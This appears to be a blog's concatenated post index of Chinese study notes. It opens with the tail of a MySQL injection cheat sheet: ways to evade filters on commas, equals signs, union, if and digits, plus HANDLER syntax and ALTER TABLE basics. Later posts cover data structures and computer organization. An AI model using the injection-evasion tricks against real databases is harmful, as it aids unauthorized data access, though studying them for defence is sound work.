可以使用字符串的 16 进制表示一个字符串, 也可以通过 char 或 concat与chr组合 来合成字符串,或使用进制转换函数表示成其他进制例: SELECT * FROM users WHERE username = 0x44756d62 逗号被过滤 substr 与 limit 12substr(data FROM 1 for 1) # substr(data, 1, 1)limit 9 offset 4 # limit 9,4 使用 join 注入 1SELECT * FROM ((SELECT id FROM user)a join (SELECT name FROM user)b join (SELECT password FROM user)c)` 等价于 `SELECT id,name,password FROM user 等号或 like 被过滤 使用 正则表达式REGEXP 或 in != 和 &lt;&gt; 都是不等于 if 被过滤 case when condition then 1 else 0 end union被过滤 使用/*!union*/可以绕过对union的过滤 数字被过滤 代替字符 对应的数 对应的字符 false 0 无 !pi() 0 无 true 1 无 !!pi() 1 无 true+true 2 无 floor(pi()) 3 无 ceil(pi()) 4 无 floor(version()) 5 无 ceil(version()) 6 无 ceil(pi()+pi()) 7 无 floor(version()+pi()) 8 无 floor(pi()*pi()) 9 无 ceil(pi()*pi()) 10 A ceil(pi()*pi())+true 11 B ceil(pi()+pi()+version()) 12 C floor(pi()*pi()+pi()) 13 D ceil(pi()*pi()+pi()) 14 E ceil(pi()*pi()+version()) 15 F floor(pi()*version()) 16 G ceil(pi()*version()) 17 H ceil(pi()*version())+true 18 I floor((pi()+pi())*pi()) 19 J ceil((pi()+pi())*pi()) 20 K ceil(ceil(pi())*version()) 21 L ceil(pi()*ceil(pi()+pi())) 22 M ceil((pi()+ceil(pi()))*pi()) 23 N ceil(pi())*ceil(version()) 24 O floor(pi()*(version()+pi())) 25 P floor(version()*version()) 26 Q ceil(version()*version()) 27 R ceil(pi()*pi()*pi()-pi()) 28 S floor(pi()*pi()*floor(pi())) 29 T HANDLER 语句代替SELECT查询语法如下: 12345678910HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE 附录 Mysql的基本操作 Sqlmap的使用 SQL fuzz 字典 Mysql的基本操作 修改表名12alter table test_a rename to sys_app;retable table test_a to sys_app; 修改表注释1alter table sys_application comment '系统信息表'; 修改字段类型和注释1alter table sys_application modify column app_name varchar(20) COMMENT '应用的名称'; 修改字段类型1alter table sys_application modify column app_name text; 设置字段允许为空1alter table sys_application modify column description varchar(255) null COMMENT '应用描述'; 增加一个字段，设好数据类型，且不为空，添加注释1alert table sys_application add `url` varchar(255) not null comment '应用访问地址'; 增加主键 1alter table t_app add aid int(5) not null ,add primary key (aid); 增加自增主键 1alter table t_app add aid int(5) not null auto_increment ,add primary key (aid); 修改为自增主键1alter table t_app modify column aid int(5) auto_increment ; 修改字段名字(要重新指定该字段的类型)1alter table t_app change name app_name varchar(20) not null; 删除字段 1alter table t_app drop aid; 在某个字段后增加字段1alter table `t_app` add column gateway_id int not null default 0 AFTER `aid`； #(在哪个字段后面添加) 调整字段顺序 1alter table t_app change gateway_id gateway_id int not null after aid ; #(注意gateway_id出现了2次) Sqlmap的使用sqlmap用法 SQL fuzz 字典sql_fuzz)dict 欢迎大家在评论区补充未提到的方法 参考 对MYSQL注入相关内容及部分Trick的归类小结","link":"/2021/05/16/SQL_Inject/"},{"title":"数据结构——基础知识","text":"数据结构复习笔记 基本概念 数据信息的载体 数据元素数据的基本单位,由若干个数据组成 数据对象相同性质的数据元素集合 数据类型值的集合和对集合的操作 1.原子类型: 不可再分 2.结构类型: 值可以再分解成若干数据类型 3.抽象数据类型: 组织与之相关的操作(可以用来定义一个完整的数据结构) 数据结构 相互之间存在一种多多种特定关系的数据元素集合 数据结构独立于其存储结构 逻辑结构- 线性结构 一般线性表 受限线性表: 栈、队列、串 - 线性表推广 线性表推广: 数组 非线性结构 集合 树: 一般树、二叉树 图: 有向图、无向图 存储结构 顺序存储 逻辑上相邻的元素物理位置也相邻 优点 ① 随机存取;② 每个元素占用最少的存储空间 缺点 只能使用相邻的存储单元, 可能产生较多的外部碎片 链式存储 逻辑上相邻的元素物理位置上不一定相邻, 使用元素存储地址指针表示逻辑关系 优点 不会出现碎片现象, 能充分利用所有存储单元 缺点 ① 存储会占用额外的存储空间; ② 只能顺序存储 索引存储 在存储元素信息和索引表(索引表每项称为索引项) 优点 检索速度快 缺点 ① 索引表占用额外存储空间; ② 增删数据时,需要花费额外时间修改索引表 散列存储(哈希存储) 根据元素关键字直接计算出元素的存储地址 优点 检索、增加、删除结点的操作快 缺点 对散列函数要求高， 若散列函数有缺点，会出现元素存储单元冲突，为解决冲突而增加时间和空间开销的问题 时间/空间复杂度 常见的时间复杂度$O(1) &lt; O(\\log_2n) &lt; O(n\\log_2n) &lt; O(n^2) &lt; O(n^3) &lt; O(2^n) &lt; O(n!) &lt; O(n^n)$ 齐次线性递推关系 $$T(n) = \\begin{cases}1, n=1,2\\aT(n-1) + bT(n-2)\\\\end{cases}$$ 主要计算$$T(n) = T(n-1) + T(n-2)\\quad ①$$ $①式$为二阶线性常系数齐次差分方程$$X_{k+2} = AX_{K+1}+bX_K \\quad ②$$其中$a^2+4b\\not=0$如果等比数列 $\\lambda^k$ 是$②式$的解,则有$$\\lambda^2-a\\lambda-b=0\\quad ③$$解$③式$得$\\lambda_1,\\lambda_2$, 且$X_k=C_1\\lambda_1^k+C_2\\lambda_2^k \\quad ④$可将特解(如$k=1,2$)带入$④式$中得到$C_1,C_2$ 主定理主定理适用于如下表达式$$f(n)=af(\\frac{n}{b}) + g(n)$$计算主定理类型的时间复杂度的方法为:$n^{\\log_ba}$ 与 $g(n)$ 比阶, 则$$T(n)=\\begin{cases}n^{\\log_ba} \\ \\ \\quad\\quad \\quad n^{\\log_ba} &gt; g(n)\\\\g(n) \\quad \\quad \\quad \\quad n^{\\log_ba} &lt; g(n)\\\\n^{\\log_ba}\\log_2n \\quad n^{\\log_ba} = g(n)\\\\\\end{cases}$$","link":"/2021/06/16/DataStructure_1/"},{"title":"计算机组成原理——计算机系统概述","text":"计算机组成原理——计算机系统概述笔记 硬件的发展 第一代: 电子管时代 第二代: 晶体管时代 第三代: 中小规模集成电路时代 第四代: 大规模,超大规模集成电路时代 现代系列机指令系统不向后兼容 数据大小 比特:bit,也叫一位,也可以叫b 字节:byte,等于8bit 1B=8bit 字:word,一般等于16bit,两个字节(由机器的硬件决定) 双字:dword,等于32bit,4个字节 冯诺依曼机 首次提出 存储程序 概念 特点(考点) 计算机由五大部件组成(运算器,存储器,控制器,输入设备,输出设备) 指令和数据以同等地位存储在存储器中(可按地址寻访) 指令和数据用二进制表示 指令由操作码和地址码组成 存储程序 以运算器为中心(导致数据处理变慢) 区分指令与数据的依据 指令周期的不同阶段 工作方式 控制流驱动方式 现代计算机以存储器为中心 基本硬件 输入设备: 将信息转换成机器能识别的形式 输出设备: 将结果转换成人们收悉的形式 存储器: 存放数据和程序 注: 现代计算机的MAR与MDR一般在存储器中, 而不再CPU中CPU中的指令寄存器(IR)和存储器中的MAR,MDR对用户完全透明(不可见) 存储体: 存放数据 存储单元: 每个存储单元存放一串二进制码 存储字: 存储单元中二进制代码的组合 存储字长: 存储单元中二进制代码的位数 存储元: 存储一个二进制位(1bit) MAR(地址寄存器): 存储数据地址 MAR位数反应存储单元的个数 如MAR有4位,则对应16个存储单元(可以表示6个地址) MDR(数据寄存器): 存储由MAR获得的数据 MDR位数等于存储字长 如MDR有16位,则可以存放一个字(word)(16bit)的信息 相联存储器即可按地址寻找,也可按内容寻址 CPUCPU是指利用大规模集成电路计算把计算机的运算部件和控制部件做在一块集成电路的芯片CPU中包括运算器 控制器 和 寄存器 运算器: 算术运算 逻辑运算 ACC: 累加器 MQ: 乘商寄存器 x: 通用的操作数寄存器 ALU: 算术逻辑单元 控制器: 指挥各部件 CU: 控制单元, 给出控制信号 IR: 指令寄存器,存放当前执行的指令 PC: 程序计数器,存放下一条指令地址(取址后自动加1) 寄存器 地址寄存器 指令寄存器(IR) 通用寄存器 CPU内部用于整数运算的运算器和通用寄存器的位数等于机器字长指令字长=存储字长(MDR)=机器字长 CPU的计算题 时钟周期: 单位 微妙 纳秒 $CPU主频(时间频率)=\\frac{1}{CPU的时钟周期}$,单位赫兹(Hz) CPI: 指令执行所需的时钟周期数量 IPS: $每秒执行多少条指令=\\frac{主频}{平均CPI}$ FLOPS: 每秒钟可以执行多少次浮点运算 一般使用IPS标志系统性能 最小时间单位是时钟周期 常说的运算速度就是指CPI 这里常考计算,因此要注意$程序的运行时间=\\frac{指令数量}{IPS}$ ,有时题目会挖坑改变CPI,因此要注意转换问题$1G=10^3M=10^6K=10^9$, 用来表示$Hz, IPS, FLOPS$, 如$MHz, MIPS$$1MHz=1\\mu s, 1Hz=1ms$两个芯片片内逻辑相同=两个芯片的CPI相同 常见表示方法 寄存器名: 表示地址 (寄存器名): 表示寄存器的值 M: 表示存储器 性能指标存储器的容量计算 设MAR的位数位为$a$MDR的位数为$b$则 $存储器的总容量=2^a*b(bit)$ 系统整体 数据通路带宽数据总线一次冰雪传送信息的位数 吞吐量: 系统在单位时间内处理请求的数量 响应时间: 指用户向计算机发送一个请求,到系统对该请求做出响应所需要的等待时间 数据的存储方式和排列 大端模式(最高有效字节MSB)(便于人阅读)最高有效字节存放在低地址,最低有效字节存放在高地址部分 小端模式(最低有效字节LSB)(便于机器使用)最高有效字节存放在高地址, 最低有效字节存放在低地址部分 边界对齐计算机每次访存只能读/写1个字,边界对齐牺牲部分空间,来提高访存效率(如果一个变量的存放位置在两个字直接,就要访存2次才能读取完,采用边界对齐的方式,可以减少这样的情况发生) 存储程序原理存储程序是将指令以代码的形式先输入计算机主存储器, 然后按其在存储器中的首地址执行程序的第一条指令, 以后就按该程序的规定顺序执行其他指令, 直至程序结束 计算机按照此原理具有以下功能 1. 数据传送功能 2. 数据存储功能 3. 数据处理功能 4. 操作控制功能 5. 操作判断功能","link":"/2021/06/19/COP-1/"},{"title":"计算机组成原理——数据的表示和运算","text":"计算机组成原理——数据的表示和运算笔记 基础知识 基数每个数码位所用的不同符号的个数,r 进制的基数为 r 转换 整数部分 小数部分 BCD 码4bit表示一个十进制的字符 8421 码 属于有权码, $4$ 个比特对应 8421如$0001_2=1_{10}$, $1000_2=8_{10}$ , $1001_2=9_{10}$ 加法运算 方法 1转换成 $10$ 进制数后相加,得到的结果在转换为 BCD 码 方法 2:二进制相加,得到的结果如果大于 $10_{10}(1010_{2}-1111_{2})$ ,则结果加 $6$ 修正,高位没 4 位则在左边补 0如 $0101_{2}+1000_{2}=1101_{2}=13_{10}$,结果大于 $10_{10}(1010_{2}-1111_{2})$,结果加 $6$, 即$1101_{2}+0110_{2}=10011_2$, 结果小于 8 位,补三个 0 得到 0001,0011 每四位转换成$10$进制 ($0001_2=1_{10}$, $0011_2=3_{10}$) 结果为 $13$ 余三码在 8421 码的基础上每个数加上($0011_2$) 如:用余三码表示$1_{10}$, 8421 码对应的$1_{10}$为$0001_2$,加上$0011_2$,结果为$0100_2$ 属于无权码(对应的每个 2 进制位没有对应的 10 进制) 2421 码 4 个二进制位分别对应 2421 所表示十进制数0-4 的二进制首位位 0所表示十进制数5-9 的二进制首位位 1 属于有权码, $4$ 个比特对应 2421 字符与字符串 ASCII 码 汉字 区位码 国标码 机内码 校验码(重要)基础概念 码字由若干位代码组成的一个字 码字间的距离两个码字逐位对比,具有不同位的个数 码距各合法码字间的最小距离 $码距=1$ 时,无检错能力$码距=2$ 时,有检错能力$码距 \\geq 3$ 时,可以有检错和纠错能力(如海明码) 奇偶校验码 奇校验码: 整个校验码(有效信息位和校验位)中 1 的 个数为奇数 偶校验码: 整个校验码(有效信息位和校验位)中 1 的 个数为偶数 如果接收到的数据中,1 的个数不为奇数(偶数),则可以判断出错. 如果出现偶数个错误,则奇偶校验码检验不出错误 偶校验的实现各信息进行异或,得到的数字添加在最高位 偶校验的检验对收到的信息每个为进行异或,得到的结果为 0,则可能没错(可能有 2 位出错), 若为 1 则一定出错 海明码 基于偶校验的扩展,拥有多个校验位,能够自动检测出 1 位出错,并纠错但是对于 2 位以上的出错只能检验出错误(使用全校验码的前提下) 海明码校验位的位置 信息位有 $n$ 位, 校验位有 $k$ 位, 共 $n+k$ 位,对应 $2^k$ 种状态($2^k \\geq n+k+1$) 每个校验位放在 $2^{i-1}$ 上(如 P1,P2,P3),然后将信息位依次从低到高进行填充(如 $D_1,D_2,D_3,D_4$) 检测 d 位错, 码距为 d+1纠错 d 位, 码距为 2d+1 校验位的计算 其中数据位$D_i$对应的$H_j$, 求j的二进制,如$D_3$存放在$H_6$中 $6_{10}=0110_2$, 对应的二进制中,第二位和第三位为1,因此该数据位需要由$P_2,P_3$ 来检验, 以此类推,得出 $$D_1,D_2,D_4需要由P_1检验\\\\\\\\ D_1,D_3,D_4需要由P_1检验\\\\\\\\ D_2,D_3,D_4需要由P_1检验 P_i=所有需要通过P_i检验的数据位的值一起异或 $$ 即可得到海明码 纠错(仅限 1bit 出错)$S_1=P_1$ 异或属于 $P_1$ 分组的数据$S_2=P_2$ 异或属于 $P_2$ 分组的数据$S_3=P_3$ 异或属于 $P_3$ 分组的数据如果 $S_1$ $S_2$ $S_3$ 都为 0 则没有出错如果不为 0则 $S_3, S_2, S_1$ 组成的二进制数所指的位数出错如 $S_1=0, S2 =1, S3=0$, 则 $010_2=2_{10}$,第二位出错 全校验码通常会在头部在加一个校验位,计算所有校验位的偶校验码 CRC 码(循环冗余校验码) 原理双方约定一个除数,$K个信息位+R个校验位$作为被除数,添加校验位后需保证除法的余数为 $0$ $$生成多项式=除数\\\\ 校验位的长度 R=生成多项式的最高次幂\\\\ CRC 码位数=K+R=N=信息码\\\\ 若满足: 2^R \\geq K+R+1 则可以检验并纠正 1 个 bit 错误$$ 计算 校验位 R 信息码左移 R 位,地位补 0(右边添加 R 个 0) 用生成多项式进行模 2 除法,产生余数(R 位) 检验方使用信息吗除以约定好的除数,结果为 0 则没有出错;若不为 0,则得到的结果出错 模 2 除: 被除数的最高位为 1,则商 1,然后减除数;除数的最高位为 0,则商 0 然后减 0; 其余位进行模 2 减 模 2 减相当于异或操作 定点数定点小数定点小数是纯小数, 小数点在符号位之后,有效数值最高位之前若 $X=x_0x_1x_2x_3\\dots x_n$, 则$x_0$为符号位, $x_1x_2x_3\\dots x_n$为数值有效部分,也称为尾数 定点整数定点整数是存整数, 小数点在有效数值最低位之后若 $X=x_0x_1x_2x_3\\dots x_n$, 则$x_0$为符号位, $x_1x_2x_3\\dots x_n$为数值有效部分,也称为尾数 无符号数 全部二进制位均表示数值位, 没有符号位 会求表示范围 无符号数无小数部分 设字长 $n$ 位,则表示范围位 $0至2^n-1$ 有符号数的编码原码 原码表示数 用尾数表示真值的绝对值, 符号位0,1对应正,负 符号位都在最高位 小数点左边的为整数部分,右边为小数部分 定点小数 小数点在最前方(隐含) 设字长位 $n+1$ 位,则$$表示范围=-(1-2^{-n}) \\leq x \\leq 1-2^{-n}$$ 有 +0 与-0 的区分 定点整数 小数点在最后方(隐含)设机器字长为 $n+1$ 位,则$$表示范围=-(2^n - 1)\\leq x\\leq 2^n - 1$$ 注意: 0有+0和-0 反码 反码表示数 若符号位为0, 则反码与原码相同若符号位为1, 则反码是原码的数值为全部取反 定点整数与定点小数的表示范围与原码的表示范围相同 补码 补码表示数 若符号位为0, 则补码与原码相同若符号位为1, 则 $补码=反码+1$(要考虑进位) 负数补码的巧妙方法(0 不能用这种方法)看原码,从右往左找到1(不包括符号位),这个1的左边(不包括这个 1 和符号位)的数取反,其余的不变如10101010100的补码为11010101100补码转原码:看原码,从右往左找到1(不包括符号位),这个1的左边(不包括这个 1 和符号位)的数取反,其余的不变如11010101100的原码为10101010100 若字长为 $n+1$ ,则定点整数范围: $-2^n\\leq x\\leq 2^{n-1}$; 注: 补码中 $0.0000_2=0_{10},1.0000_2=-1$, 即比原码中多-1定点小数范围: $-1\\leq x\\leq 1-2^{-n}$ 注: 补码中 $0.0000_2=0_{10},10000_2=-2^n$, 即比原码中多$-2^n$ 作用: 将减法操作转变为加法操作 补码表示的负定点小数有$[Y]补=2+[Y]{真值}$ 移码 移码表示数 移码=真值+偏置值 补码的基础上将符号位取反,只能表示整数 方便比较大小 当偏置值=128 时, 表示范围与补码的表示范围一致 定点数的运算移位运算 算术移位操作对象为有符号数,符号位不动,数值位移到 原码 右移: 高位补0, 低位舍弃,若 $舍弃的位=0$ ,相当于除 $2$ ,若舍弃的位不为 $0$ ,则会丢失精度 左移: 低位补0, 高位舍弃,若 $舍弃的位=0$ ,相当于乘 $2$ ,若舍弃的位不为 $0$,则会丢失精度 反码正数与原码操作相同操作负数时: 右移: 高位补1,低位舍弃 左移: 低位补1, 高位舍弃 补码正数与原码操作相同负数 最右边的1及其右边的数同原码操作 最右边的1其左边的数同反码操作 移码左移右移都是补 0 逻辑移位将操作对象看为无符号数左移时高位丢弃, 低位补 0右移时低位丢弃, 高位补 0 循环移位 定点数加减运算 原码 加法规则先判断符号位若相同, 则为绝对值之和, 符号位不变若不同, 则做减法, 绝对值大的减去绝对值小的, 符号位等于绝对值大的数的符号位 减法规则将减数符号位取反, 然后按照加法规则运算 补码 在补码的加减运算中, 符号位也参与运算, 符号位产生的进位丢弃 $[A+B]补 = [A]补 + [B]补$ $[A-B]补 = [A]补 + [-B]补$ 加减及溢出判断只有正数相加才会有上溢, 只有负数相加才会有下溢 方法 1:设$[A+B]_补=[S]_补$A 的符号位为 aB 的符号位为 bS 的符号位为 s$V = a\\bar{b}\\bar{s}+\\bar{a}\\bar{b}s$若 $V=1$,表示有溢出若 $V=0$,表示无溢出 方法 2:采用符号位的进位 C 和最高数值进位 S若 $C=0,S=1$,则出现上溢若 $C=1,S=0$,则出现下溢 方法 3(双符号位补码)(模 4 补码)(运算时会复制一个符号位)采用双符号位,若两个符号位的数值不一致,则有溢出 00 表示结果为正数 01 表示结果正溢 10 表示结果负溢 11 表示结果为负数例如: $A=00001111_2 B=11101000_2$在进行加法运算时$A=000001111_2 B=111101000_2$相加后 $C=111110111_2$ ,两个符号位一致,则结果无溢出, $C=11110111_2$ 乘法运算使用双符号位 原码一位乘法$[x]_原 * [y]_原$, 字长为 n+1 位, 高位为符号位 符号位不参与运算, 符号位单独运算: $符号位=x的符号位 \\bigoplus y的符号位$ 进行 n 轮加法,加完一轮后,逻辑右移(符号位也参与移动),高位补 0,当前计算结果的最低位,往右移到 MQ 的最高位,辅助位初始为 0,每次右移 MQ 的最低为变为辅助位(MQ 初始数值为乘数) $MQ最低位=1$ 时,加 $|x|_原$$MQ最低位=0$ 时,加 0 补码一位乘法$[x]_补*[y]_补$ 字长为 n+1 位, 高位为符号位 进行 n 轮加法,做完一轮加法时,算数右移(符号位不动)及高位补符号位,最后在进行一次加法,当前计算结果的最低为,往右移到 MQ 的最高位,辅助位初始为 0,每次右移 MQ的最低为变为辅助位 $辅助位-MQ最低为位=1$,加 $[x]_补$$辅助位-MQ最低位=0$,加 0$辅助位-MQ最低位=-1$,加 $[-x]_补$符号位参与运算 除法运算 $[x]_原 \\div [y]_原$在定点小数的除法中,被除数要小于除数 补码除法运算(加减交替法) 符号位单独运算: $符号位=x的符号位 \\bigoplus y的符号位$ 一共 $n = 机器字长-符号位长$ 次运算, 每次加除数的绝对值的负数的补码,如果结果为负数,则将本次的商改为 0,并且将余数恢复为减法之前(加回除数) 每一次操作后,进行一次逻辑左移,低位补 0 (最后一次上商余数补左移)(一共左移 n 次,上商 n+1 次) 原码除法运算(不恢复余数法) 符号位也参与运算 一共 $n = 机器字长-符号位长$ 次运算, 余数为负, 则余数左移一位后加 $|除数|$余数为正, 则余数左移一位后减 $|除数|$ 最后一步, 若余数为负,则商 0,并加上 $|除数|$ 得到正确的余数 余数的正负性与商相同 符号扩展(数据位数增长) 定点整数 正数高位都补0, 负数原码补0, 反码补码补1 定点小数 正数地位都补0, 负数反码补1, 原码补码补0 强制转换C 语言中整型都是用补码表示 长度相同的有符号数转换成无符号数,符号位不变,将符号位添加位权(即符号位变成一个数) 长整型变短整型, 高位被截断, 只保留低位 短整型变长整型, 相当于做符号扩展 浮点数浮点数的组成 由 阶码和尾数组成 阶码: 用补码或移码表示的定点整数,其位数表示数的范围及小数点的位置(真值即为 E) 尾数: 用原码或补码表示的定点小数,其位数反应浮点数的精度(真值即为 M) 尾数的规格化(左规): 最高位不能是 0(注意是数符后面的那位) 尾数的规格化(右规): 尾数溢出时(双符号位为 01 或 10 )时,将尾数右移一位,阶码加 1 原码表示的规格化尾数能表示的范围为$正数 \\frac{1}{2} \\leq M \\leq 1-2^{-n}$$负数: -(1-2^{-n}) \\leq M \\leq - \\frac{1}{2}$ 补码表示的规格化尾数能表示的范围为$正数: \\frac{1}{2} \\leq M \\leq 1-2^{-n}$$负数: -1 \\leq M \\leq -(\\frac{1}{2} + 2^{-n})$规格化补码表示尾数时,符号位必须与最高数值位相反:如$0,101010_2$(正数), $1,0101010_2$(负数) 阶符,数符: 表示阶码和尾数的符号$真值 N = r^E + M (r为底数,通常为2)$ IEEE 754 标准 尾数部分默认表示 1.M(注意这个 1 是数值,而不是符号位)(隐含最高位) 原码规格化后 正数为: 0.1xxx, 负数为 1.1xxx补码规格化后 正数为: 0.1xxx, 负数为 1.0xxx 阶码真值 = 移码 - 偏移量 当阶码 E 全为0,尾数不全为0时, 表示非规格化小数, $\\pm(0.xxx)_2\\times 2^{-126}$ , 此时隐含最高位变为 0,阶码真值固定视为-126当阶码 E 全为0,尾数全为0时表示真值 $\\pm 0$当阶码 E 全为1,尾数全为0时,表示无穷大 $\\pm \\infty$当阶码 E 全为1,尾数不全为0时,表示非数值 NaN (如$\\frac{0}{0}, \\infty \\pm \\infty$ 等非法运算的结果就是 NaN) 各种浮点数的格式要记住 类型 数符 阶码位数 尾数数值位数 总位数 偏置值 float 短浮点数 1 8 23 32 7FH(127) double 长浮点型 1 11 52 64 3FFH(1023) long double 临时浮点数 1 15 64 80 3FFFH(16383) 浮点数的运算 加减运算步骤: 对阶,尾数加减, 规格化, 舍入, 判断溢出 对阶低阶转换成高阶,使两个数同阶 尾数加减因为以及化成了同阶,直接对尾数进行加减 规格化尾数加减后,出现 0.0xxx 的情况下,进行左规. 如果出现99.31等类型的情况,需要右规, 尾数算数右移一位,阶码加 1,直到$尾数 \\leq 1$ 舍入舍弃低位的尾数, 根据不同的舍入规则进行计算 判断溢出看阶码的位数是否超出所能表示的最大范围,若超出则溢出尾数溢出不一定会导致整体溢出 边界对齐边界对齐方式存储数据时,数据的大小都是 $(半字大小)\\times 2k$如 12345struct{ int a; //4字节(32位) char b; //1字节(8位) short c; ..2字节(16位)}record 若按边界对齐的方式存储该结构体,则如下表 1 2 3 4 a 的第一个字节 a 的第二个字节 a 的第三个字节 a 的第四个字节 b 空 c 的第一个字节 c 的第二个字节 若按边界不对齐的方式存储该结构体,则如下表 1 2 3 4 a 的第一个字节 a 的第二个字节 a 的第三个字节 a 的第四个字节 b c 的第一个字节 c 的第二个字节 空 C 语言中的数据在 C 语言的数据在内存中为补码形式 重点概括原码、反码、补码的表示范围 字长为 $n+1$ 编码形式 定点小数(纯小数) 定点整数(纯整数) 原码 $-(1-2^{-n}) \\leq x \\leq 1-2^{-n}$ $-(2^n-1) \\leq x \\leq 2^n-1$ 反码 $-(1-2^{-n}) \\leq x \\leq 1-2^{-n}$ $-(2^n-1) \\leq x \\leq 2^n-1$ 补码 $-1\\leq x \\leq 1-2^{-n}$ $-2^n\\leq x \\leq 2^n-1$ ALU 主要功能 算术运算: 加 减 乘 除 等 逻辑运算: 与 或 非 异或等 辅助功能: 移位 求补等 加法器一位全加器$A_i,B_i为两个输入,表示当前要加的数值, C_{i-1}表示进位,C_i表示本位进位 S_i表示输出$ $S_i = A_i \\bigoplus B_i \\bigoplus C_{i-1}$ &gt;$C_i = A_iB_i + (A_i \\bigoplus B_i)C_{i-1}$ 串行加法器只有一个全加器,数据逐位串行送入加法器中运算,进位存放在进位触发器中. 串行进位的并行加法器 把 n 个一位全加器串接起来 优化(并行进位的并行加法器) 如图,展开到 $C_0$ 后, 即可提前计算出每一位的进位","link":"/2021/06/20/COP-2/"},{"title":"计算机组成原理——指令系统","text":"计算机组成原理——指令系统笔记 指令格式由操作码和地址码组成 按指令格式分类 零地址指令OP 不需要操作数, 如空操作,停机, 关中断等 堆栈计算机, 操作数隐含存放在栈顶,结果压回栈顶 一地址指令OP(A), A表示操作数地址 (A)表示地址中的内容 只需要单操作数, 如加 1, 减 1, 取反, 求补等, 并将结果存回操作数(完成一次需要 3 次访存)([取址]–&gt;[读 A]–&gt;[写 A]) 需要两个操作数, 另一个操作数隐含在寄存器中 二地址指令OP(A1)(A2) ,其中A1为目的操作数, A2为源操作数将操作结果写道目的操作数A1需要访存 4 次([取址]–&gt;[读 A1]–&gt;[读 A2]–&gt;[写 A1]) 三地址指令OP(A1)(A2)(A3), 将对A1,A2的操作结果写入A3需要访存 4 次([取址]–&gt;[读 A1]–&gt;[读 A2]–&gt;[写 A3]) 四地址指令OP(A1)(A2)(A3), 将对A1,A2的操作结果写入A3, A4为下一条将要执行的指令地址, 将 PC 的值修改为A4指向的地址需要访存 4 次([取址]–&gt;[读 A1]–&gt;[读 A2]–&gt;[写 A3]) 按指令长度分类 定长指令字结构指令系统中所有指令长度相等 变长指令字结构指令系统中各指令的长度不等 按操作码长度分类 定长操作码指令系统中所有指令的操作码长度都相同控制器的译码电路设计简单, 灵活性低 可变长操作码指令系统中各指令的操作码长度可变控制器的译码电路设计复杂, 但是更灵活 按操作类型分类 数据传送指令把寄存器(存储器)中的数据放到存储器(寄存器) 运算类指令 算数逻辑指令如加减乘除,与或非等 移位操作算数移位, 逻辑移位, 循环移位等 程序控制类指令程序执行流的改变语句等 输入输出指令CPU 寄存器与 IO 端口之间的数据传送 扩展操作码定长指令格式+可变长操作码=扩展操作码指令格式 例如在 16 位指令字长的计算机中, 每个地址码占 4 位 3 地址指令中,高 4 位分别表示指令$1,2\\dots 15, 即 0001_2, 0010_2 \\dots 1110_2$, 而$1111_2$表用来表示该地址为 2 地址指令 同理, 在二地址指令中, 高 4 为全为 1, 次高 4 的$1,2\\dots 15, 即 0001_2, 0010_2 \\dots 1110_2$用来表示 15 条二地址指令, $1111_2$表用来表示该地址为 1 地址指令 以此类推… 设计扩展操作码的注意事项 不允许短码是长码的前缀, 即短操作码不能与长操作码前面的部分相同 各指令的操作码不能重复 注: 对于使用频率高的指令可以分配较端的操作码, 减少指令译码和分析的时间 优点在指令字长有限的前提下仍保持比较丰富的指令种类 缺点增加了指令译码器和分析的难度, 使控制器的设计复杂 指令寻址确定下一条指令的存放地址在取完指令后一定会 PC+1, 指向下一条要执行的语句 下一条要执行的指令地址始终在 PC 中按字编址: 即一个存储字长为一个地址按字节编址: 一个字节为一个地址 顺序寻址 使用定长指令结构,主存字节编址$a(bit)=指令字长=存储字长$则每次 PC 的值加$\\frac{a}{8}$ 使用变长指令结构, 主存按字节编址 读入一个字, 根据操作码 pan’d 这条指令的总字节数 n (PC) = (PC) + n 跳跃寻找在遇到 JMP 等转移指令时, 会修改 PC 的值 数据寻址确定当前正在运行的指令的地址码指明的真实地址在地址前面加上寻址特征标识用哪种方式来寻址,将被标识的地址成为形式地址(A), 真实地址记为 EA 直接寻址EA=A 形式地址就是操作数的真实地址 优点实现简单, 指令执行阶段只访问一次主存, 不需要专门计算操作数地址 缺点操作数不易修改 间接寻址EA = (A) 形式地址存储的数据是操作数的有效地址(而不是操作数的值) 指令的执行取指令访存 1 次, 执行指令访存 2 次(如不考虑存储结果) 优点可扩大寻址范围(有效地址 EA 的位数大于形式地址 A 的位数)便于编制程序(方便子程序返回) 缺点 指令在执行阶段要多次访存(一次间接寻址需两次访存) 寄存器寻址EA=R 操作数为寄存器所在的编号, 操作数在R所指的寄存器内 指令的执行取址访存一次, 执行指令不需要访存 优点指令在执行阶段不访问主存,只访问寄存器指令字短且执行速度快,支持向量/矩阵运算 缺点寄存器个数有限 寄存器间接寻址EA=(R) 寄存器中存的是操作数所在地址 指令的执行取址令访存一次, 执行指令访存一次 优点与一般间接寻址比速度更快 缺点指令执行的阶段需要访问主存 隐含寻址操作数的地址不明显, 在指令中隐含着操作数的地址 优点有利于缩短指令字长 缺点需增加存储操作数或隐含地址的硬件 立即寻址形式地址就是操作数本身, 一般采用补码形式 执行执行只需在取指令的时候访存一次 优点指令执行阶段不访问主存, 指令执行时间最短 缺点 A 的位数限制了立即数的范围 基址寻址EA=(BR)+A 以程序额度起始存放地址为起点 将CPU中基址寄存器(BR)的内容加上指令中的形式地址A形成的有效地址 (或者在指令中指明将哪个寄存器作为基址寄存器) (BR作为基地址, A作为偏移量) 基址寄存器的内容由操作系统管理 优点可以扩大指令的寻址范围用户不必考虑程序存于主存的哪一位置有利于多道程序设计, 可用于编制浮动程序 变址寻址EX=(IX)+A 程序员决定起点的位置 有效地址等于形式地址与变址寄存器IX的内容相加 (也可以用通用寄存器作为变址寄存器) 编制寄存器是面向用户, 程序执行过程中, 变址寄存器的内容可以由用户改变 (A作为基地址, IX作为偏移量) 优点在数组处理过程中, 可以设定 A 为数组的首地址, 不断改变变址寄存器 IX 的内容,便可轻松的形成数组中任意 ui 数据的地址, 特别适合编制循环程序 相对寻址EA=(PC)+A(A用补码表示) 以程序计数器PC所指的地址为起点 把程序计数器的内容加上形式地址A(A为下一条地址的偏移量) 优点 代码在程序内浮动时, 不用更改跳转指令的地址,广泛用于转移指令 堆栈寻址操作数存放在堆栈中, 隐含使用堆栈指针(SP)作为操作数地址 硬堆栈: 使用寄存器软堆栈: 在主存中 总结 寻址方式 有效地址 